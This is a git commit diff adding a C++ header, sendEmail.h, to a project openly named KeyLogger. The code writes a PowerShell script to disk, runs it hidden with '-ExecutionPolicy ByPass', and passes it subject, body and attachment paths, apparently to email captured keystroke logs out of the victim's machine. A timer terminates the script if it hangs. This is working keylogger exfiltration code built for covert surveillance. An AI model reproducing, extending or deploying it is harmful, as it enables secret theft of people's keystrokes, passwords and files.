52375ae9b132fd319ba448c77ef16ecd94b0fdd4
Joseph Schell <JosephSchell510@gmail.com>
2018-08-14 02:32:22 -0700

    Finished the send email header file.

--- KeyLogger/sendEmail.h
+++ KeyLogger/sendEmail.h
@@ -8,7 +8,7 @@
 #include "timer.h"
 #include "helper.h"
 
-#define SCRIPT_NAME "sm.ps1"
+#define SCRIPT_NAME "psScript.ps1"
 
 namespace Mail
 {
@@ -56,13 +56,132 @@ namespace Mail
 	#undef X_EM_FROM
 	#undef X_EM_TO
 	#undef X_EM_PASS
+
+	Timer m_timer;
+
+	std::string stringReplace(std::string str, const std::string &keyStr, 
+		const std::string &newStr)
+	{
+		if (keyStr.empty()) { return str; }
+
+		size_t strPosition = 0;
+
+		while ((strPosition = str.find(keyStr, strPosition)) != std::string::npos)
+		{
+			str.replace(strPosition, keyStr.length(), newStr), 
+				strPosition += newStr.length();
+		}
+
+		return str;
+	}
+
+	bool checkFileExists(const std::string &fileName)
+	{
+		std::ifstream file(fileName);
+
+		return (bool)file;
+	}
+
+	bool createScript()
+	{
+		std::ofstream script(inputOutput::getOurPath(true) + 
+			std::string(SCRIPT_NAME));
+
+		if (!script) { return false; }
+
+		script << PowerShellScript;
+
+		if (!script) { return false; }
+
+		script.close();
+		return true;
+	}
+
+	int sendMail(const std::string &subject, const std::string &body, 
+		const std::string &attachments)
+	{
+		bool ok;
+
+		ok = inputOutput::makeDir(inputOutput::getOurPath(true));
+
+		if (!ok) { return -1; }
+
+		std::string scr_path = inputOutput::getOurPath(true) + 
+			std::string(SCRIPT_NAME);
+
+		if (!checkFileExists(scr_path))
+		{
+			ok = createScript();
+		}
+			
+		if (!ok) { return -2; }
+
+		// Bypass PowerShell need for Admin privileges 
+		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + 
+			"\" -Subj \"" + stringReplace(subject, "\"", "\\\"") + "\" -Body \"" + 
+			stringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
+
+		SHELLEXECUTEINFO ShExecInfo = { 0 };
+		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+		ShExecInfo.hwnd = NULL;
+		ShExecInfo.lpVerb = "open";
+		ShExecInfo.lpFile = "powershell";
+		ShExecInfo.lpParameters = param.c_str();
+		ShExecInfo.lpDirectory = NULL;
+		ShExecInfo.nShow = SW_HIDE;
+		ShExecInfo.hInstApp = NULL;
+
+		ok = (bool)ShellExecuteEx(&ShExecInfo);
+
+		if (!ok) { return -3; }
+
+		WaitForSingleObject(ShExecInfo.hProcess, 7000);
+		DWORD exitCode = 100;
+		GetExitCodeProcess(ShExecInfo.hProcess, &exitCode);
+
+		m_timer.setFunction([&]()
+		{
+			WaitForSingleObject(ShExecInfo.hProcess, 6000);
+			GetExitCodeProcess(ShExecInfo.hProcess, &exitCode);
+
+			if ((int)exitCode == STILL_ACTIVE)
+			{
+				TerminateProcess(ShExecInfo.hProcess, 100);
+			}
+				
+			Helper::writeLogFile("<From SendMail> Return Code: " + 
+				Helper::toString((int)exitCode));
+		});
+
+		m_timer.repeatCount(1L);
+		m_timer.setInterval(10L);
+		m_timer.start(true);
+
+		return (int)exitCode;
+	}
+
+	int sendMail(const std::string &subject, const std::string &body, 
+		const std::vector<std::string> &att)
+	{
+		std::string attachments = "";
+
+		if (att.size() == 1U)
+		{
+			attachments = att.at(0);
+		}
+		else
+		{
+			for (const auto &v : att)
+			{
+				attachments += v + "::";
+			}
+				
+			attachments = attachments.substr(0, attachments.length() - 2);
+		}
+
+		return sendMail(subject, body, attachments);
+	}
 }
-
-
-
-
-
-
-
 
 #endif _SENDEMAIL_H_
